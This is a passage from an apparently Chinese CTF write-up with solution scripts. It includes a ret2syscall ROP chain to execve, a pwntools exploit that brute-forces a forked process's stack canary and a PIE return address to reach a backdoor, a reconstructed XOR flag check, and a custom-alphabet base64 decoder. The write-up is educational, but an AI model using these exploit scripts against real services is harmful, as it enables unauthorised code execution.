ret = 0x040101a

# 构造syscall ROP链（经典的ret2syscall解法）
payload += p64(ret) + p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdx_rbx) + p64(0x0) + p64(1) + p64(pop_rdi) + p64(name)
payload += p64(pop_rsi) + p64(0x0) + p64(0x45A066)

taolve.recvuntil(b"\n")
taolve.sendline(payload)
taolve.interactive()

pwn-funcanary # 

from pwn import *
import struct

is_debug = 1
is_remote = 1

if is_debug:
    context.log_level = 'debug'

if is_remote == 1:
    taolve = remote("123.56.135.185", 31924)
else:
    taolve = process('./pwn')


taolve.recvuntil(b'welcome\n')
# canary的最后一个字节固定为\x00
canary = b'\x00'

# 检验我们填充的 padding 的长度是否正确
taolve.send(b'a' * 104 + canary)
a = taolve.recvuntil(b'welcome\n')
if b'have fun\n' in a:
    print("ok")

# 拖到ida查看，可以看到fork函数，
# fork函数相当于是在不断的进行一个自我复制，所以每一次复制出来的程序的canary值也是一样。
# 我们可以进行一个逐位的爆破，如果程序异常退出没有打印“have fun”，就说明这一位不对，
# 如果程序正常，打印了“have fun”，就可以接着跑下一位
# 所以我们循环7次来爆破出canary的前7位字节
for j in range(7):
    for i in range(0x100):
        taolve.send(b'a' * 104 + canary + struct.pack('B', i))
        a = taolve.recvuntil(b'welcome\n')
        if b'have fun\n' in a:
            canary += struct.pack('B', i)
            break

print("canary ".encode('utf-8') + canary)

# ida 上可以看到后门函数的地址是0x01229
# 程序开了PIE保护，不过最后三位的地址时不变的
# 所以我们覆盖返回地址时可以直接覆盖第一个十六进制位为\x31,
# 而第二个十六进制位则可以采用爆破的方式

backdoor = b"\x31"

for j in range(1):
    for i in range(0x100):
        backdoor1 = backdoor + struct.pack('B', i)
        payload = b'a' * 104 + canary + b'a' * 8 + backdoor1
        taolve.send(payload)
        a = taolve.recvuntil(b'welcome\n')
        if b'flag' in a:
            # 当接收到flag字符串时程序停止
            pause()
            taolve.interactive()

先在网站打开题目发过来的xml项目，看到代码块，将代码块翻译成c++代码

#include<vector>

int main() {
	vector<int>secret = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 };
	string flag;
	vector<int>test;
	cin >> flag;
	for (int i = 0; i < flag.length(); i++) {
		int tmp;
		if (i == 0) {
			tmp = (int)flag[i] ^ 0;
		}
		else {
			tmp = (int)flag[i] ^ (int)flag[i - 1];
		}
		test.push_back(tmp);
	}
	if (test.size() == secret.size()) {
		bool is_ok = true;
		for (int i = 0; i < test.size(); i++) {
			int item = test[i];
			int b = secret[i];
			if (item<b || item>b) {
				is_ok = false;
			}
		}
		if (is_ok) {
			cout << "well done!";
		}
	}
	return 0;
}

Crypto-Sign_in_passwd #

flag文件里有两行字符串，

j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D

GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5

观察后推测第一行是类似base64编码后的密文， 第二行有 “%”，推测是进行了url编码

第一行字符串不能直接用欧通的base64解码，也不能用base91、base92等，

而第二行url解码之后是：

GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5

可以看这一个字符串是base64码表的乱序，

推测是以第二行字符串为新的码表来对第一行进行解码得到flag

由于“=”号在码表中间，所以把最后面的5当作是原来的“=”号，

可以直接自己写一个base64解码脚本，也可以直接上网搜base64解码脚本再修改码表

# 改变后的码表
s = "GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"


def base64_changed_decode(inputs):
    # 将字符串转化为2进制
    bin_str = []
    for i in inputs:
        if i != '5':
            x = str(bin(s.index(i))).replace('0b', '')
            bin_str.append('{:0>6}'.format(x))
    # print(bin_str)
    # 输出的字符串
    outputs = ""
    nums = inputs.count('=')
    while bin_str:
        temp_list = bin_str[:4]
        temp_str = "".join(temp_list)
        # print(temp_str)
        # 补足8位字节
        if (len(temp_str) % 8 != 0):
            temp_str = temp_str[0:-1 * nums * 2]
        # 将四个6字节的二进制转换为三个字符
        for i in range(0, int(len(temp_str) / 8)):
            outputs += chr(int(temp_str[i * 8:(i + 1) * 8], 2))
        bin_str = bin_str[4:]
    print("Decrypted String:\n%s " % outputs)


input_str = input("Please enter a string that needs to be decrypted: \n")
base64_changed_decode(input_str)
